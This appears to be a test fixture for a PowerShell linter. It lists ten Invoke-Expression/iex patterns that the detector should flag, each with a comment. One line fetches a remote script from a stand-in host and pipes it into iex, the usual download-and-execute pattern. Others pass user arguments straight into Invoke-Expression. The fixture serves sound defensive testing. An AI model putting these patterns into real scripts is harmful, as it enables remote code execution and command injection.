# Bad fixture: multiple Invoke-Expression / iex calls that should each be flagged.

$cmd = "Get-Process"
Invoke-Expression $cmd                          # 1: variable into Invoke-Expression

$action = $args[0]
iex $action                                      # 2: alias `iex` with variable

# Pipeline output into iex (the canonical drive-by pattern):
iex (Invoke-RestMethod "https://example.test/payload.ps1")  # 3: pipeline result into iex

function Run-For($target) {
    Invoke-Expression "Deploy-$target -Force"   # 4: interpolated string into iex
}
Run-For prod

# Even literal-looking strings get flagged — the smell is the cmdlet itself:
Invoke-Expression 'Get-Date'                     # 5: literal-string Invoke-Expression

# Inside a conditional / pipeline / scriptblock — still detected:
if ($cmd) { iex $cmd }                           # 6: inside scriptblock
$result = iex $cmd                               # 7: after `=` (assignment)
$cmd | ForEach-Object { iex $_ }                 # 8: inside ForEach-Object scriptblock

# Explicit -Command parameter form:
Invoke-Expression -Command $cmd                  # 9: -Command param

# After a `;` separator on the same line:
$x = 1; iex $cmd                                 # 10: after `;`
